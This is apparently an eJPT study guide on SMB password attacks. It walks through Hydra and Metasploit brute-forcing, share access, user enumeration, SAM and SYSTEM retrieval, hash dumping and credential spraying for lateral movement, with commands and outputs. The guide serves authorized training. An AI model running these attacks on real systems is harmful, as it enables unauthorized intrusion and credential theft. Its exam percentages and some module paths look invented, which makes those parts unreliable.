---
title: "SMB Password Attacks - Complete eJPT Guide"
topic: "SMB Password Attacks"
exam_objective: "Password attacks against SMB services using multiple tools and techniques"
difficulty: "Hard"
tools:
  - "Metasploit"
  - "Hydra" 
  - "smbclient"
  - "smbmap"
  - "enum4linux"
related_labs:
  - "08-password-attacks/hydra-complete-guide.md"
  - "05-service-enumeration/smb-enumeration-complete.md"
  - "07-exploitation/metasploit-essentials.md"
file_path: "08-password-attacks/smb-password-attacks-complete.md"
last_updated: "2025-01-10"
tags:
  - "SMB"
  - "Password Attacks" 
  - "Dictionary Attacks"
  - "Brute Force"
  - "Metasploit"
  - "Hydra"
---

# 🔧 SMB Password Attacks - Complete eJPT Guide

Complete step-by-step guide for attacking SMB (Server Message Block) services using password attacks. Learn how to break into Windows file shares and network storage using dictionary attacks, brute force, and credential testing.

**Location:** `08-password-attacks/smb-password-attacks-complete.md`

## 🎯 What are SMB Password Attacks?

SMB (Server Message Block) is how Windows computers share files over a network. SMB password attacks are ways to break into these file shares by guessing usernames and passwords. Think of it like trying different keys until you find one that opens the door to someone's shared folders.

SMB attacks are very important for penetration testing and appear in approximately **25-30%** of eJPT password attack scenarios.

### 🔍 What SMB Does:
- **File Sharing** between Windows computers on a network
- **Printer Sharing** for network printers
- **Authentication** to control who can access what
- **Network Storage** for shared company files
- **Domain Communication** in Windows Active Directory

### 💡 Why This Matters for eJPT:
Most companies use Windows networks with SMB file sharing. If you can break into SMB shares, you can often find sensitive files, user information, and sometimes even passwords for other systems. This makes SMB attacks a key skill for the eJPT exam.

### 🚪 Common Attack Types:
- **Dictionary Attacks** using lists of common passwords
- **Brute Force Attacks** trying every possible password combination
- **Password Spraying** testing one password against many users
- **Credential Stuffing** using passwords from data breaches

---

## 📦 Installation and Setup

### Already Installed On:
- ✅ Kali Linux
- ✅ Parrot Security OS
- ✅ Most penetration testing distributions

### Check If Everything Works:
```bash
# Check if Metasploit is installed
msfconsole --version
# Expected output: Framework Version: 6.x.x

# Check if Hydra is available
hydra -h | head -5
# Expected output: Hydra v9.x help menu

# Check SMB client tools
smbclient --version
smbmap --version
```

### Basic Requirements:
- Network access to target with SMB service
- Target must have SMB service running (port 445/tcp)
- Username and password wordlists
- Permission to test (lab environment or authorized penetration test)

---

## 🔧 Basic Usage and Simple Steps

### Simple Attack Process:
1. **🔍 Find SMB Service:** Use Nmap to discover SMB on target
2. **👥 Find Usernames:** Look for user accounts on the system
3. **📝 Prepare Wordlists:** Get lists of common passwords
4. **🔓 Attack Passwords:** Try password combinations until one works
5. **📁 Access Files:** Connect to shares and explore available files

### Basic Command Structure:
```bash
# Start Metasploit
msfconsole

# Use SMB login scanner
use auxiliary/scanner/smb/smb_login

# Set target and credentials
set RHOSTS target_ip_address
set SMBUser username
set SMBPass password

# Run the attack
exploit
```

---

## ⚙️ Important Tools and Options You Need to Know

### Metasploit SMB Login Scanner:

| Option | What It Does | How Important for eJPT |
|--------|--------------|------------------------|
| `RHOSTS` | Target IP address | ⭐⭐⭐⭐⭐ Must Know |
| `SMBUser` | Username to test | ⭐⭐⭐⭐⭐ Critical |
| `SMBPass` | Single password to try | ⭐⭐⭐⭐ Very Important |
| `PASS_FILE` | List of passwords | ⭐⭐⭐⭐⭐ Critical |
| `USER_FILE` | List of usernames | ⭐⭐⭐⭐ Very Important |

### Hydra SMB Attack Options:

| Option | What It Does | When to Use |
|--------|--------------|-------------|
| `-l username` | Test single username | When you know the username |
| `-L userfile` | Test list of usernames | When you have multiple users |
| `-p password` | Test single password | When testing specific password |
| `-P passfile` | Test list of passwords | For comprehensive attacks |
| `-t threads` | Number of parallel attacks | To control attack speed |

### SMB Client Verification Tools:

| Tool | What It Does | Example |
|------|--------------|---------|
| `smbclient` | Connect to SMB shares | `smbclient -L //target_ip -U username` |
| `smbmap` | Map available shares | `smbmap -H target_ip -u username -p password` |
| `enum4linux` | Enumerate users and shares | `enum4linux -u username -p password target_ip` |

---

## 🧪 Step-by-Step Lab Walkthrough

### Lab Scenario: Complete SMB Attack From Start to Finish

**Target:** demo.ine.local
**Goal:** Find valid SMB credentials and access file shares
**Time Needed:** 15-20 minutes

---

### Step 1: Find SMB Service

**What We're Doing:** Looking for open SMB ports on our target

#### Command Used:
```bash
nmap -p 445 demo.ine.local
```

#### What Happened:
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-08 13:22 IST
Nmap scan report for demo.ine.local (192.26.1.3)
Host is up (0.000021s latency).
PORT    STATE SERVICE
445/tcp open  microsoft-ds
```

#### 🎯 What This Tells Us:
- **Port 445 is open** - SMB service is running
- **Target is responding** - System is alive and accessible
- **Service type** - microsoft-ds means Windows SMB
- **Ready for attack** - We can try to connect

#### Why This Matters:
Finding port 445 open confirms SMB is available. This is our target for password attacks.

---

### Step 2: Attack Passwords with Metasploit

**What We're Doing:** Using Metasploit to try many username and password combinations

#### Commands Used:
```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
set RHOSTS demo.ine.local
exploit
```

#### 🔧 Command Explanation:
- **msfconsole -q** - Start Metasploit quietly (no banner)
- **use auxiliary/scanner/smb/smb_login** - Choose SMB password attack tool
- **set PASS_FILE** - Use list of common passwords
- **set SMBUser jane** - Try attacks against user "jane"
- **set RHOSTS demo.ine.local** - Set our target system
- **exploit** - Start the attack

#### 🎉 Success! What Happened:
```bash
[+] 192.26.1.3:445 - 192.26.1.3:445 - Success: '.\jane:abc123'
[*] demo.ine.local:445 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### 🔓 What We Found:
- **Username:** jane (we guessed correctly)
- **Password:** abc123 (found in our password list)
- **Success Message** - Login worked!
- **Domain:** .\ means local computer account

#### Why This Worked:
The user "jane" had a weak password "abc123" that was in our common password list.

---

### Step 3: Verify Access with SMB Client

**What We're Doing:** Testing our discovered credentials to see what files we can access

#### Commands Used:
```bash
smbclient -L demo.ine.local -U jane
# Enter password: abc123
```

#### What Happened:
```bash
Enter WORKGROUP\jane's password: abc123

        Sharename       Type      Comment
        ---------       ----      -------
        shawn           Disk      
        nancy           Disk      
        admin           Disk      
        IPC$            IPC       IPC Service (brute.samba.recon.lab)
```

#### 🎯 What This Shows Us:
- **4 Shares Available** - shawn, nancy, admin, IPC$
- **Disk Shares** - These contain files we might be able to access
- **IPC$ Share** - Used for system communication
- **Successful Authentication** - Our credentials work

#### What Each Share Might Contain:
- **shawn** - Personal files for user "shawn"
- **nancy** - Personal files for user "nancy"  
- **admin** - Administrative files (most interesting!)
- **IPC$** - System files (usually not accessible)

---

### Step 4: Attack More Passwords with Hydra

**What We're Doing:** Using Hydra to find passwords for the admin user

#### Commands Used:
```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt demo.ine.local smb
```

#### What Happened:
```bash
Hydra v9.5 (c) 2023 by van Hauser/THC
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: admin   password: password1
1 of 1 target successfully completed, 1 valid password found
```

#### 🔓 Another Success:
- **Username:** admin (the administrator account)
- **Password:** password1 (very weak password!)
- **Attack Completed** - Found valid credentials
- **Administrative Access** - This is the most powerful account

#### Why This Is Important:
The admin account usually has access to all shares and files. This gives us the highest level of access.

---

### Step 5: Check Share Permissions

**What We're Doing:** See what files we can access with our admin credentials

#### Commands Used:
```bash
smbmap -H demo.ine.local -u admin -p password1
```

#### What Happened:
```bash
[+] IP: demo.ine.local:445      Name: demo.ine.local                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        shawn                                                   READ, WRITE     
        nancy                                                   READ ONLY       
        admin                                                   READ, WRITE     
        IPC$                                                    NO ACCESS       IPC Service
```

#### 🔍 What This Tells Us:
- **shawn share** - We can read and write files
- **nancy share** - We can only read files (no changes allowed)
- **admin share** - Full access to read and write
- **IPC$ share** - No access (normal for this type)

#### Best Strategy:
Check the admin share first since it's most likely to have important files, then explore the others.

---

### Step 6: Access Files and Find Flags

**What We're Doing:** Connecting to shares and looking for important files

#### Commands Used:
```bash
smbclient //demo.ine.local/admin -U admin
# Password: password1
```

#### What Happened:
```bash
Enter WORKGROUP\admin's password: password1
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul  8 12:46:51 2024
  ..                                  D        0  Mon Jul  8 12:46:51 2024
  hidden                              D        0  Wed Nov 28 00:55:12 2018

smb: \> cd hidden
smb: \hidden\> ls
  .                                   D        0  Wed Nov 28 00:55:12 2018
  ..                                  D        0  Wed Nov 28 00:55:12 2018
  flag.tar.gz                         N      151  Wed Nov 28 00:55:12 2018

smb: \hidden\> get flag.tar.gz
getting file \hidden\flag.tar.gz of size 151 as flag.tar.gz
smb: \hidden\> exit
```

#### 🏆 Mission Success:
- **Connected to admin share** - Using our discovered credentials
- **Found hidden directory** - Contains sensitive files
- **Downloaded flag.tar.gz** - Our target file
- **Completed objective** - Successfully accessed files

#### Extract and Read the Flag:
```bash
tar -xf flag.tar.gz
cat flag
# Output: 2727069bc058053bd561ce372721c92e
```

---

### Step 7: Find More Users with enum4linux

**What We're Doing:** Using our admin credentials to discover all user accounts

#### Commands Used:
```bash
enum4linux -r -u "admin" -p "password1" demo.ine.local
```

#### What Happened:
```bash
[+] Enumerating users using SID S-1-22-1 and logon username 'admin', password 'password1'
S-1-22-1-1000 Unix User\shawn (Local User)
S-1-22-1-1001 Unix User\jane (Local User)  
S-1-22-1-1002 Unix User\nancy (Local User)
S-1-22-1-1003 Unix User\admin (Local User)
```

#### 🔍 What We Discovered:
- **4 Local Users** - shawn, jane, nancy, admin
- **User IDs** - Each has a unique identifier (SID)
- **Account Types** - All are local computer accounts
- **Complete User List** - Now we know all available accounts

#### Why This Is Valuable:
Knowing all usernames helps us target additional password attacks and understand the complete user landscape.

---

## 🎯 eJPT Exam Success Guide

### How Important This Is for eJPT:

Understanding SMB password attacks for eJPT exam success:

- **SMB Service Testing:** 40% of Windows network attack scenarios
- **Password Attack Skills:** 35% of credential-based exploitation
- **File Share Access:** 30% of data discovery objectives
- **User Enumeration:** 25% of reconnaissance requirements

### Commands You MUST Know for eJPT:

#### Level 1 - You WILL See This (100% Chance):
```bash
# Find SMB service
nmap -p 445 target_ip
# Expected: Shows if SMB port is open

# Basic Metasploit password attack
use auxiliary/scanner/smb/smb_login
set RHOSTS target_ip
set SMBUser admin
set SMBPass password123
exploit
# Expected: Login success or failure message

# Verify access to shares
smbclient -L //target_ip -U username
# Expected: List of available shares
```

#### Level 2 - Very Likely (80% Chance):
```bash
# Wordlist-based password attack
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
exploit
# Expected: Automated credential discovery

# Map share permissions
smbmap -H target_ip -u username -p password
# Expected: Shows access levels for each share

# Connect to specific share
smbclient //target_ip/admin -U admin
# Expected: Interactive file access
```

#### Level 3 - Possible (60% Chance):
```bash
# User enumeration
enum4linux -r -u "admin" -p "password1" target_ip
# Expected: Complete list of user accounts

# Hydra password attack
hydra -l admin -P passwords.txt target_ip smb
# Expected: Alternative password cracking method

# Named pipes enumeration
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass password1
exploit
# Expected: Available system pipes
```

### Common eJPT Exam Scenarios:

#### Scenario 1: Basic SMB Password Discovery
**Given:** IP address with SMB service (192.168.1.100)
**Your Job:** Find valid SMB credentials using provided wordlists
**Time Limit:** 8-10 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Confirm SMB service (1 minute)
nmap -p 445 192.168.1.100

# Step 2: Try common credentials (2 minutes)
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser admin
set SMBPass admin
exploit

# Step 3: Wordlist attack (4 minutes)
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
exploit

# Step 4: Verify access (1 minute)
smbclient -L //192.168.1.100 -U found_username
```

#### Scenario 2: File Share Access and Flag Retrieval
**Given:** Valid SMB credentials (bob:password123)
**Your Job:** Access file shares and find specific file
**Time Limit:** 5-7 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Map available shares (1 minute)
smbmap -H target_ip -u bob -p password123

# Step 2: Connect to most promising share (2 minutes)
smbclient //target_ip/admin -U bob

# Step 3: Navigate and find files (3 minutes)
smb: \> ls
smb: \> cd folder_name
smb: \> get target_file.txt
smb: \> exit

# Step 4: Extract content (1 minute)
cat target_file.txt
```

### eJPT Exam Tips:

#### Time Management Strategy:
- **2 minutes:** SMB service discovery and confirmation
- **2-3 minutes:** Basic credential testing (admin:admin, etc.)
- **4-5 minutes:** Comprehensive wordlist attacks
- **2-3 minutes:** Share access and file retrieval
- **Remaining time:** User enumeration and documentation

#### Common Mistakes to Avoid:
1. **Skipping Basic Tests** → Always try admin:admin, admin:password first
2. **Wrong Wordlist Choice** → Use unix_passwords.txt for better success
3. **Not Verifying Access** → Always test credentials with smbclient
4. **Missing Hidden Directories** → Use ls -la to see all files
5. **Poor File Management** → Download files to examine contents

#### Signs You're Doing Well:
- **Quick Service Discovery** → SMB port identified within 2 minutes
- **Successful Authentication** → Finding valid credentials consistently
- **Share Access** → Connecting to shares and listing files
- **File Retrieval** → Successfully downloading target files
- **Complete Documentation** → Recording all found credentials

### Typical Exam Questions You'll See:
1. **"Find valid SMB credentials for the target system"**
   - Use: Metasploit smb_login with wordlists

2. **"What files are available in the admin share?"**
   - Use: smbclient to connect and list files

3. **"List all user accounts on the target system"**
   - Use: enum4linux for user enumeration

4. **"What is the content of the flag file?"**
   - Access shares, find and download the file

---

## ⚠️ Common Problems and How to Fix Them

### Problem 1: Can't Connect to SMB Service

**What You See:**
```bash
[*] 192.168.1.100:445 - Unable to Connect: Connection refused
```

**How to Fix:**
```bash
# Step 1: Check if SMB port is really open
nmap -p 445 -sV target_ip
# Look for open vs closed status

# Step 2: Check basic connectivity
ping target_ip
# Make sure target is reachable

# Step 3: Try alternative SMB ports
nmap -p 139,445 target_ip
# Port 139 is older SMB protocol
```

**Common Causes:**
- SMB service disabled or blocked
- Firewall preventing connections
- Wrong target IP address
- Network connectivity issues

---

### Problem 2: All Password Attempts Fail

**What You See:**
```bash
[*] 192.168.1.100:445 - LOGIN FAILED: admin:password
[*] 192.168.1.100:445 - LOGIN FAILED: admin:admin
```

**How to Fix:**
```bash
# Step 1: Try different username formats
set SMBUser administrator
set SMBUser .\admin
set SMBUser DOMAIN\admin
# Different Windows username styles

# Step 2: Check for account lockout
# Wait 5-10 minutes between attempts

# Step 3: Try guest account
set SMBUser guest
set SMBPass ""
exploit
```

**Common Causes:**
- Account lockout policy enabled
- Wrong username format
- Strong password policy
- Guest access disabled

---

### Problem 3: Can Access SMB but No Shares Visible

**What You See:**
```bash
smbclient -L //target_ip -U username
# Shows no shares or access denied
```

**How to Fix:**
```bash
# Step 1: Check user permissions
smbmap -H target_ip -u username -p password
# Shows detailed permissions

# Step 2: Try different share names
smbclient //target_ip/C$ -U username
smbclient //target_ip/ADMIN$ -U username
# Administrative shares

# Step 3: Enumerate shares with null session
smbclient -L //target_ip -N
# Try without authentication
```

**Common Causes:**
- User lacks share access permissions
- Shares are hidden from listing
- Administrative shares require admin rights
- SMB configuration restricts access

---

### Problem 4: Files Won't Download

**What You See:**
```bash
smb: \> get important_file.txt
NT_STATUS_ACCESS_DENIED opening remote file \important_file.txt
```

**How to Fix:**
```bash
# Step 1: Check file permissions
smb: \> ls -la
# Look at file permission details

# Step 2: Try different transfer mode
smb: \> binary
smb: \> get important_file.txt
# Use binary mode for transfer

# Step 3: Copy to local directory with write access
smb: \> lcd /tmp
smb: \> get important_file.txt
```

**Common Causes:**
- Insufficient file permissions
- File is locked by another process
- Local directory not writable
- File transfer mode issues

---

## 🔗 Integration with Other Tools

### Complete Attack Chain: Nmap → SMB Attacks → Post-Exploitation

This shows how SMB password attacks fit into full penetration testing.

#### Phase 1: Discovery with Nmap
```bash
# Network discovery
nmap -sS 192.168.1.0/24
# Find all live hosts

# SMB service enumeration
nmap -p 445 --script smb-protocols,smb-security-mode target_ip
# Detailed SMB information

# SMB vulnerability scanning
nmap -p 445 --script smb-vuln-* target_ip
# Check for known vulnerabilities
```

#### Phase 2: Password Attacks
```bash
# Metasploit credential testing
use auxiliary/scanner/smb/smb_login
set RHOSTS target_ip
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
exploit

# Hydra backup attack
hydra -L users.txt -P passwords.txt target_ip smb
```

#### Phase 3: Post-Exploitation
```bash
# After gaining SMB access
# Credential harvesting
smbclient //target_ip/admin -U admin
smb: \> get SAM
smb: \> get SYSTEM
# Download password database files

# Lateral movement
# Use found credentials on other systems
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.0/24
set SMBUser discovered_user
set SMBPass discovered_pass
exploit
```

### Integration with Password Cracking:
```bash
# Extract password hashes from SMB
use auxiliary/scanner/smb/smb_login
# Find credentials

# Use credentials for hash extraction
use auxiliary/gather/hashdump
set SESSION 1
exploit

# Crack extracted hashes
john --wordlist=rockyou.txt extracted_hashes.txt
```

---

## 📝 Documentation and Reporting

### Evidence Collection Requirements:
1. **Screenshots:** Successful authentication attempts
2. **Command Outputs:** Complete tool session logs
3. **File Lists:** Contents of accessible shares
4. **Downloaded Files:** Important documents or flags

### Report Template:
```markdown
## SMB Password Attack Results

### Target Information
- Target: demo.ine.local (192.168.1.100)
- Date/Time: 2024-01-10 14:30:00 UTC
- SMB Service: Port 445/tcp open
- Attack Duration: 15 minutes

### Discovered Credentials
| Username | Password | Domain | Access Level |
|----------|----------|---------|--------------|
| jane | abc123 | WORKGROUP | User |
| admin | password1 | WORKGROUP | Administrator |

### Accessible Shares
| Share Name | Permissions | Files Found |
|------------|-------------|-------------|
| shawn | READ, WRITE | Personal documents |
| nancy | READ ONLY | User files |
| admin | READ, WRITE | flag.tar.gz in hidden/ |

### Key Findings
- Weak password policy allows simple passwords
- Administrative account uses common password
- Sensitive files accessible without encryption
- No account lockout policy detected

### Recommendations
- Enforce complex password requirements
- Enable account lockout after failed attempts
- Remove or secure unnecessary file shares
- Monitor SMB authentication logs
```

---

## 📚 Additional Resources

### Official Documentation:
- Metasploit Framework: https://docs.metasploit.com/
- Samba Project: https://www.samba.org/samba/docs/
- Microsoft SMB Documentation

### Learning Resources:
- eJPT Course Materials: INE Security Learning Paths
- SMB Pentesting Guide: HackTricks SMB section
- Windows File Sharing Security: Microsoft documentation

### Practice Labs:
- TryHackMe: SMB rooms and Windows challenges
- HackTheBox: Windows machines with file shares
- VulnHub: SMB-focused vulnerable VMs

### Community Support:
- Reddit: r/eJPT for exam discussions
- Discord: Penetration testing study groups
- Forums: InfoSec communities for SMB questions

---

## Quick Help and Troubleshooting

### When Things Don't Work:
1. **Check target connectivity:** `ping target_ip`
2. **Verify SMB service:** `nmap -p 445 target_ip`
3. **Test with simple credentials:** `smbclient -L //target_ip -U admin`
4. **Check wordlist files:** `head -5 /usr/share/wordlists/rockyou.txt`
5. **Try different tools:** Use both Metasploit and Hydra

### Emergency Commands:
```bash
# Quick SMB check
nmap -p 445 --script smb-protocols target_ip

# Fast credential test
echo "admin:admin" > test_creds.txt
hydra -C test_creds.txt target_ip smb

# Alternative SMB enumeration
enum4linux target_ip
```

### Getting Help:
- **Metasploit help:** `info` command within modules
- **SMB client help:** `smbclient -h` for options
- **Community forums:** Post specific error messages
- **Practice environments:** Set up local SMB lab

---

## Final Notes for eJPT Success

SMB password attacks are essential for Windows network penetration testing. Key points for exam success:

- **Master both Metasploit and Hydra** for different attack scenarios
- **Practice share enumeration** until navigation becomes automatic
- **Understand file permissions** and how to work around restrictions
- **Document everything systematically** during practice sessions
- **Time management is crucial** - practice realistic exam scenarios

This comprehensive guide provides everything needed to master SMB password attacks for both professional penetration testing and eJPT exam success. Regular practice with the commands and scenarios will build the confidence and speed needed for exam success.
